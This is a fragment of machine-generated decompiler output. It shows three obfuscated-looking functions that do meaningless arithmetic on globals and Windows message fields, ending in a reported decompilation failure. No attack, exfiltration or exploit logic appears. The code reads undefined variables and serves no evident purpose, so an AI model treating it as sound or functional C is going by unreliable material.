// 4080DE: using guessed type int *off_4080DE[7];
// 408122: using guessed type int *off_408122[4];

//----- (00406D17) --------------------------------------------------------
void __userpurge Cn_zb_kimt(unsigned int a1@<ebx>, int a2)
{
  unsigned int v2; // ecx
  unsigned int v3; // [esp+1Ch] [ebp-20h]
  unsigned int v4; // [esp+24h] [ebp-18h]
  int savedregs; // [esp+3Ch] [ebp+0h] BYREF

  v2 = (__PAIR64__(dword_408064, a1) - __PAIR64__(*off_4081B6, v4)) >> 32;
  dword_408064 = v2;
  *(_DWORD *)off_408146 = (__PAIR64__(*(_DWORD *)off_408146, v3) - __PAIR64__((unsigned __int16)dword_408078, v2)) >> 32;
  *(_DWORD *)off_40813E += (unsigned __int8)dword_40807C + (v2 < (unsigned int)&savedregs);
}
// 406D2C: variable 'v4' is possibly undefined
// 406D44: variable 'v3' is possibly undefined
// 408064: using guessed type int dword_408064;
// 408078: using guessed type int dword_408078;
// 40807C: using guessed type int dword_40807C;
// 40813E: using guessed type void *off_40813E;
// 408146: using guessed type void *off_408146;
// 4081B6: using guessed type int *off_4081B6;

//----- (00406D5B) --------------------------------------------------------
void __stdcall _GB_EN_JsqcfcxodtJ_n_j(unsigned __int16 *a1)
{
  unsigned int v1; // [esp+4h] [ebp-20h]

  *(_DWORD *)off_40816A |= (unsigned __int16)dword_408050;
  dword_408054 |= (unsigned __int8)dword_407FB8;
  Msg.hwnd = (HWND)((__PAIR64__((unsigned int)Msg.hwnd, (unsigned __int8)dword_407FB8) - __PAIR64__(*off_408196[0], v1)) >> 32);
}
// 406D94: variable 'v1' is possibly undefined
// 407FB8: using guessed type int dword_407FB8;
// 408050: using guessed type int dword_408050;
// 408054: using guessed type int dword_408054;
// 40816A: using guessed type void *off_40816A;
// 408196: using guessed type int *off_408196[9];

//----- (00406DA0) --------------------------------------------------------
unsigned int __userpurge ti_o__o_s@<eax>(unsigned int result@<eax>, __int16 *a2)
{
  unsigned int v2; // [esp+4h] [ebp-18h]

  Msg.time ^= dword_408078;
  Msg.message += *off_408182[0] + (v2 < result);
  dword_408028 += LOWORD(stru_408030.pt.x);
  return result;
}
// 406DBA: variable 'v2' is possibly undefined
// 408028: using guessed type int dword_408028;
// 408078: using guessed type int dword_408078;
// 408182: using guessed type int *off_408182[14];

// nfuncs=40 queued=39 decompiled=39 lumina nreq=0 worse=0 better=0
#error "There were 1 decompilation failure(s) on 39 function(s)"
